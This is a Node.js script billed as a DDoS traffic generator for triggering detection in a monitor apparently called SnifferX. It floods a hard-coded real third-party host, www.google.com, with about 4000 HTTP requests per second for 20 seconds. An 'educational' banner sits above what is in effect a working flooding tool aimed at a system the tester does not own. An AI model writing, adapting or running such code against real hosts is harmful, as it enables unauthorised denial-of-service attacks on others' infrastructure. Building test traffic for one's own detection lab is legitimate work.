#!/usr/bin/env node

/**
 * Simple DDoS Traffic Generator
 * Creates high-volume traffic to trigger DDoS detection (not port scan)
 * 
 * This generates REAL DDoS patterns by sending many packets to the SAME port
 * (Port scan = many different ports, DDoS = high volume to same target)
 */

const http = require('http');
const https = require('https');
const chalk = require('chalk');

// Configuration - AGGRESSIVE for testing
const TARGET_HOST = 'www.google.com';
const TARGET_PORT = 80;
const ATTACK_DURATION = 20000;  // 20 seconds
const CONCURRENT_REQUESTS = 200; // Send 200 requests at once
const BATCH_INTERVAL = 50;       // New batch every 50ms = ~4000 req/sec

class SimpleDDoSGenerator {
    constructor() {
        this.totalRequests = 0;
        this.successfulRequests = 0;
        this.failedRequests = 0;
        this.startTime = null;
    }

    displayBanner() {
        console.log(chalk.red.bold('\n╔════════════════════════════════════════════════════════╗'));
        console.log(chalk.red.bold('║           DDoS TRAFFIC GENERATOR v2.0                ║'));
        console.log(chalk.red.bold('║        (High Volume - Triggers DDoS Detection)       ║'));
        console.log(chalk.red.bold('╚════════════════════════════════════════════════════════╝'));
        console.log(chalk.yellow('⚠️  Educational Testing Only - Use Responsibly!\n'));
        console.log(chalk.cyan(`🎯 Target: ${TARGET_HOST}:${TARGET_PORT}`));
        console.log(chalk.cyan(`⏱️  Duration: ${ATTACK_DURATION / 1000} seconds`));
        console.log(chalk.cyan(`🔥 Intensity: ${CONCURRENT_REQUESTS} concurrent requests`));
        console.log(chalk.cyan(`📊 Expected Rate: ~${Math.round((CONCURRENT_REQUESTS * 1000) / BATCH_INTERVAL)} requests/sec\n`));
    }

    /**
     * Send a batch of concurrent HTTP requests
     */
    sendBatch() {
        for (let i = 0; i < CONCURRENT_REQUESTS; i++) {
            this.totalRequests++;
            
            const req = http.get(`http://${TARGET_HOST}/`, (res) => {
                this.successfulRequests++;
                res.resume(); // Consume response to free up memory
            });

            req.on('error', () => {
                this.failedRequests++;
            });

            req.setTimeout(2000, () => {
                req.destroy();
            });

            // Prevent memory leaks
            req.on('close', () => {
                req.removeAllListeners();
            });
        }
    }

    /**
     * Start the DDoS attack simulation
     */
    async start() {
        this.displayBanner();
        console.log(chalk.green.bold('🚀 Starting High-Volume Traffic Generation...\n'));
        
        this.startTime = Date.now();
        let lastLog = Date.now();

        // Send batches continuously
        const interval = setInterval(() => {
            const elapsed = Date.now() - this.startTime;
            
            // Stop after duration
            if (elapsed >= ATTACK_DURATION) {
                clearInterval(interval);
                setTimeout(() => this.showResults(), 1000);
                return;
            }

            // Send batch
            this.sendBatch();

            // Log progress every 2 seconds
            if (Date.now() - lastLog >= 2000) {
                const currentRate = Math.round(this.totalRequests / (elapsed / 1000));
                console.log(chalk.gray(`  [${Math.round(elapsed / 1000)}s] Sent: ${chalk.yellow(this.totalRequests)} requests | Rate: ${chalk.cyan(currentRate)} req/s`));
                lastLog = Date.now();
            }
        }, BATCH_INTERVAL);
    }

    /**
     * Display final results
     */
    showResults() {
        const duration = (Date.now() - this.startTime) / 1000;
        const avgRate = Math.round(this.totalRequests / duration);

        console.log(chalk.green.bold('\n\n✓ Traffic Generation Complete!\n'));
        console.log(chalk.cyan('═══════════════════════════════════════════════════════'));
        console.log(chalk.white(`  Total Requests:    ${chalk.yellow.bold(this.totalRequests)}`));
        console.log(chalk.white(`  Successful:        ${chalk.green(this.successfulRequests)}`));
        console.log(chalk.white(`  Failed/Timeout:    ${chalk.red(this.failedRequests)}`));
        console.log(chalk.white(`  Duration:          ${chalk.yellow.bold(duration.toFixed(1))} seconds`));
        console.log(chalk.white(`  Average Rate:      ${chalk.yellow.bold(avgRate)} requests/sec`));
        console.log(chalk.cyan('═══════════════════════════════════════════════════════\n'));

        if (avgRate >= 1000) {
            console.log(chalk.green.bold('✅ Rate exceeds DDoS threshold (1000 pps)!'));
            console.log(chalk.green('💡 Check SnifferX dashboard - DDoS alerts should appear!\n'));
        } else if (avgRate >= 500) {
            console.log(chalk.yellow.bold('⚠️  Rate is moderate (500-1000 pps)'));
            console.log(chalk.yellow('💡 May trigger DDoS warnings in SnifferX\n'));
        } else {
            console.log(chalk.red.bold('❌ Rate too low to trigger DDoS detection'));
            console.log(chalk.yellow('💡 Current threshold: 1000 packets/sec\n'));
            console.log(chalk.gray('   Tip: Lower the threshold in config.js for testing:\n'));
            console.log(chalk.gray('   ddos: { packetsPerSecondThreshold: 500 }\n'));
        }

        console.log(chalk.cyan('📊 Expected Detection: DDoS (high volume), NOT port scan'));
        console.log(chalk.gray('   Port scan = many ports, DDoS = high volume same target\n'));

        process.exit(0);
    }
}

// Handle Ctrl+C gracefully
process.on('SIGINT', () => {
    console.log(chalk.yellow('\n\n⚠️  Stopping traffic generation...'));
    process.exit(0);
});

// Start the generator
const generator = new SimpleDDoSGenerator();
generator.start();
